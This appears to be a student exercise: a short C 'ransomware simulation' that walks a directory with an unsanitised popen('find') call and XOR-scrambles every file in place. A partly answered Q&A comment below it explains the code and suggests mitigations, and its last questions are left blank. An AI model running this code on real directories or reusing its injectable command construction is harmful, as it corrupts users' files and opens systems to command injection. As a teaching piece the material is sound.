#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

void encrypt_file(const char* filename) {
    FILE *file = fopen(filename, "rb+");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);

    for (long i = 0; i < filesize; i++) {
        char c = fgetc(file);
        fseek(file, -1, SEEK_CUR);
        fputc(c ^ 0xFF, file);
        fseek(file, 0, SEEK_CUR);
    }

    fclose(file);
    printf("File %s encrypted.\n", filename);
}

void decrypt_file(const char* filename) {
    encrypt_file(filename); // Simple XOR encryption is reversible with the same function
}

void ransom(const char* directory) {
    struct stat st;
    if (stat(directory, &st) != 0 || !S_ISDIR(st.st_mode)) {
        perror("Invalid directory");
        return;
    }

    char command[256];
    snprintf(command, sizeof(command), "find %s -type f", directory);
    FILE* fp = popen(command, "r");
    if (fp == NULL) {
        perror("Failed to run find command");
        return;
    }

    char filepath[256];
    while (fgets(filepath, sizeof(filepath), fp) != NULL) {
        filepath[strcspn(filepath, "\n")] = 0; // Remove newline character
        encrypt_file(filepath);
    }

    pclose(fp);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <encrypt|decrypt> <directory>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "encrypt") == 0) {
        ransom(argv[2]);
    } else if (strcmp(argv[1], "decrypt") == 0) {
        ransom(argv[2]); // Using the same ransom function because of reversible XOR
    } else {
        printf("Invalid operation: %s\n", argv[1]);
        return 1;
    }

    return 0;
}


/* Q&A - Ransomware Code Simulation
1 - What is the purpose of the encrypt_file function, and how does it work?

    {
    The encrypt_file function encrypts the content of a specified file using XOR encryption. It works as following:
    It opens the determined/selected file in the read and write binary (rb+) in order to count the binary (size) of the binaries in
    the designated file/directory/path so no characters are missed due to translation. 
    The pointer is set to the end and then "ftell" we can know the exact size of the file in bytes, with that the pointer
    is again set to the start in order to proceed with the loop.
    }

2 - How does the decrypt_file function achieve decryption?

    {
    The decrypt function achieves decription by using utilizing the encrypt function once again. That because due to the simple nature 
    of a XOR function it is reversible by applying the same encryption function. (Why?)
    }

3 - Explain how the ransom function works. What does it do to each file in the specified directory?
    
    {
    The ransom function works by checking first if the directory exists and prints an error in the case of it not exist in the path.
    After that, it then builds a command to find all the files in the directory and pipes it with popen to read/record the output.
    For the last part of the code the file is processed by getting with fgets in the output all the file paths and calling the 
    encrypt function to encrypt it.
    }
4 - What potential security risks can you identify in the way the popen function is used?

    {
    The function is used in a simple or in oter words weak way by not restricting characters, validating or sanitizing input and limiting
    the char number to only some characters. The popen passes the command straight without any of the previously mentioned security
    practices. The continuity of encryption and decryption of the files without any error handling can lead to file corruption.
    }

5 - Suggest potential improvements or mitigations to secure a system against this type of ransomware.

    {
    Implement Error Handling for fseek and ftell errors regarding checking if a file is readable/writable;
    Command Injection with snprintf provided input from the user is possible, instead of simply sanitizing the input a better option is
    to use a safer alternative function like "nftw" in order to traverse directories;
    Implement backup and recovery in order to prevent loss during both enc and decryption processe.
    }

6 - What is the significance of using fgetc and fputc in the encrypt_file function?

    {
    
    }

7 - How does the program ensure that the newline character is removed from the file path before encryption?

    {}

8 - What is the potential impact of this ransomware if executed on a real system?
*/